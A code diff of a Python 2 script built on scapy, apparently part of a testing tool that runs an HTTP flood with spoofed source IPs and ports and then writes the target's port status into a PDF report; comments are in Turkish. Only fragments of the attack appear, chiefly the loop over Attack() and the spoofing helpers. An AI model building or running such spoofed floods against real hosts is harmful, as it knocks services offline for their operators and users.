@@ -1,9 +1,9 @@
 # -*- coding: utf-8 -*-
 
-import random
 from scapy.all import *
 import socket
-from createPDF import *
+import sys,os
+import time
 
 
 def SpoofIP():
@@ -14,11 +14,11 @@ def SpoofPort():
 
 def isAlive(dst,port):
 	s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
-	result = s.connect_ex((dst,int(port)) )
-	if result == 0:
-		print "{} {} is open".format(dst,port)
-	else:
-		print "{} {} is not open".format(dst,port)
+	try:
+		s.connect((dst,int(port) ) )
+		return "{} {} is open".format(dst, port)
+	except socket.error as e:
+		return "{} {} is not open".format(dst, port)
 
 
 class HTTPFlood():
@@ -36,10 +36,13 @@ class HTTPFlood():
 		for i in range(int(self.count)):
 			self.Attack()
 
-		CreatePDF("Http Flood","80 is open")
+		# isAlive fonksiyonu çalıştırılarak hedefin live olup olmadığı bilgisi dönüyor
+		hold = isAlive(self.dst, self.port)
 
-		#isAlive fonksiyonu çalıştırılarak hedefin live olup olmadığı bilgisi dönüyor
-		#isAlive(self.dst, self.port)
+		sys.path.append(os.path.join("Manage/Scripts/PDF/"))
+		from createPDF import *
+		CreatePDF("Http Flood",hold)
+
 
 	def Attack(self):
 		src_ip = SpoofIP()
